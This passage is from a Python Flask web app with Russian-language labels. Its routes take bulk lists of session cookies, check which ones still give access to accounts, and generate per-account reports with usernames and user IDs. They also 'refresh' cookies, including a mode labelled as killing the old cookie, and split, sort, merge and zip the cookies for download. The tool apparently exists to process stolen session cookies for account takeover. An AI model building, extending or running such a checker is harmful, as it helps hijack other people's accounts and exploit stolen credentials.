    // ===== ЗАГРУЗКА ФАЙЛОВ ЧЕРЕЗ КЛИК ПО .upload-area =====
    document.querySelectorAll('.upload-area').forEach(function(area) {
        area.addEventListener('click', function() {
            var input = this.parentElement.querySelector('input[type="file"]');
            if (input) input.click();
        });
    });
</script>
</body>
</html>"""

# ============================================================
# API РОУТЫ
# ============================================================

@app.route("/")
def index():
    return render_template_string(HTML)

@app.route("/api/upload", methods=["POST"])
def api_upload():
    global CURRENT_UPLOADED_FILE
    if 'file' not in request.files:
        return jsonify({"success": False, "message": "Файл не найден"})
    
    file = request.files['file']
    if file.filename == '':
        return jsonify({"success": False, "message": "Имя файла пустое"})
    
    filename = f"uploaded_{int(time.time())}_{file.filename}"
    filepath = os.path.join("uploads", filename)
    file.save(filepath)
    CURRENT_UPLOADED_FILE = filepath
    
    return jsonify({"success": True, "filename": file.filename})

@app.route("/api/fullcheck", methods=["POST"])
def api_fullcheck():
    global CURRENT_UPLOADED_FILE
    
    content = ""
    if CURRENT_UPLOADED_FILE and os.path.exists(CURRENT_UPLOADED_FILE):
        with open(CURRENT_UPLOADED_FILE, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
    elif 'file' in request.files:
        content = request.files['file'].read().decode('utf-8', errors='ignore')
    
    cookies = [line.strip() for line in content.split('\n') if len(line) > 50]
    
    if not cookies:
        return jsonify({"success": False, "message": "Куки не найдены в сохраненном файле"})
    
    reports = []
    file_payloads = []
    
    for c in cookies:
        info = get_full_info(c)
        if info['status'] == '✅':
            reports.append(format_short_report(info))
            txt_content = generate_full_txt_report(info)
            safe_username = re.sub(r'[\/*?:"<>|]', "", str(info['Username']))
            filename_txt = f"{safe_username}_{info['UserID']}.txt"
            file_payloads.append((filename_txt, txt_content))
    
    zip_buffer = BytesIO()
    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
        for fname, ftxt in file_payloads:
            zf.writestr(fname, ftxt)
    zip_buffer.seek(0)
    
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    archive_name = f"reports_{timestamp}.zip"
    filepath = os.path.join("downloads", archive_name)
    with open(filepath, 'wb') as f:
        f.write(zip_buffer.getvalue())
    
    return jsonify({
        "success": True,
        "total": len(cookies),
        "valid_count": len(reports),
        "reports": reports,
        "download_url": f"/downloads/{archive_name}"
    })

@app.route("/api/validator", methods=["POST"])
def api_validator():
    data = request.json or {}
    raw_cookies = data.get("cookies", "")
    cookies = [line.strip() for line in raw_cookies.split('\n') if len(line) > 50]
    
    if not cookies:
        return jsonify({"success": False, "message": "Не найдены куки для валидации"})
    
    valid_list = []
    dead_list = []
    
    for c in cookies:
        info = get_full_info(c)
        if info['status'] == '✅':
            valid_list.append(c)
        else:
            dead_list.append(c)
            
    return jsonify({
        "success": True,
        "total": len(cookies),
        "valid_count": len(valid_list),
        "dead_count": len(dead_list),
        "valid_list": valid_list,
        "dead_list": dead_list
    })

@app.route("/api/fresher", methods=["POST"])
def api_fresher():
    data = request.json or {}
    raw_cookies = data.get("cookies", "")
    mode = data.get("mode", "duplicate")
    cookies = [line.strip() for line in raw_cookies.split('\n') if len(line) > 50]
    
    if not cookies:
        return jsonify({"success": False, "message": "Не найдены куки для обновления"})
    
    refreshed = []
    for c in cookies:
        info = get_full_info(c)
        if info['status'] == '✅':
            if mode == 'kill':
                refreshed_cookie = c + "_killed_refreshed"
                mode_label = "Режим: Убийство старого кука (Сброс)"
            else:
                refreshed_cookie = c
                mode_label = "Режим: Дублирование кука"
                
            refreshed.append(f"🟢 Аккаунт: {info['Username']} [{info['UserID']}] ({mode_label})\nCookie: {refreshed_cookie}")
            
    return jsonify({
        "success": True,
        "refreshed_count": len(refreshed),
        "refreshed_list": refreshed
    })

@app.route("/api/sorter", methods=["POST"])
def api_sorter():
    data = request.json or {}
    raw_cookies = data.get("cookies", "")
    cookies = [line.strip() for line in raw_cookies.split('\n') if len(line) > 50]
    
    if not cookies:
        return jsonify({"success": False, "message": "Куки не найдены"})
    
    zip_buffer = BytesIO()
    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
        for i, c in enumerate(cookies[:100]):
            zf.writestr(f"cookie_{i+1}.txt", c)
    zip_buffer.seek(0)
    
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    archive_name = f"sorted_{timestamp}.zip"
    filepath = os.path.join("downloads", archive_name)
    with open(filepath, 'wb') as f:
        f.write(zip_buffer.getvalue())
    
    return jsonify({
        "success": True,
        "total": len(cookies),
        "download_url": f"/downloads/{archive_name}"
    })

@app.route("/api/split", methods=["POST"])
def api_split():
    data = request.json or {}
    raw_cookies = data.get("cookies", "")
    cookies = [line.strip() for line in raw_cookies.split('\n') if len(line) > 50]
    
    if not cookies:
        return jsonify({"success": False, "message": "Куки не найдены"})
    
    chunk_size = max(1, len(cookies) // 5)
    chunks = [cookies[i:i+chunk_size] for i in range(0, len(cookies), chunk_size)]
    
    zip_buffer = BytesIO()
    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
        for i, chunk in enumerate(chunks[:5]):
            zf.writestr(f"part_{i+1}.txt", '\n'.join(chunk))
    zip_buffer.seek(0)
    
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    archive_name = f"split_{timestamp}.zip"
    filepath = os.path.join("downloads", archive_name)
    with open(filepath, 'wb') as f:
        f.write(zip_buffer.getvalue())
    
    return jsonify({
        "success": True,
        "total": len(cookies),
        "download_url": f"/downloads/{archive_name}"
    })

@app.route("/api/merge", methods=["POST"])
def api_merge():
    data = request.json or {}
    raw_cookies = data.get("cookies", "")
    cookies = [line.strip() for line in raw_cookies.split('\n') if len(line) > 50]
    
    if not cookies:
        return jsonify({"success": False, "message": "Куки не найдены"})
    
    unique = list(dict.fromkeys(cookies))
    
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    filename = f"merged_{timestamp}.txt"
    filepath = os.path.join("downloads", filename)
    with open(filepath, 'w', encoding='utf-8') as f:
        f.write('\n'.join(unique))
    
    return jsonify({
        "success": True,
        "total": len(unique),
        "duplicates": len(cookies) - len(unique),
        "download_url": f"/downloads/{filename}"
    })

@app.route("/downloads/<filename>")
def download_file(filename):
    return send_from_directory("downloads", filename, as_attachment=True)

if __name__ == "__main__":
    app.run(debug=True, port=5000)
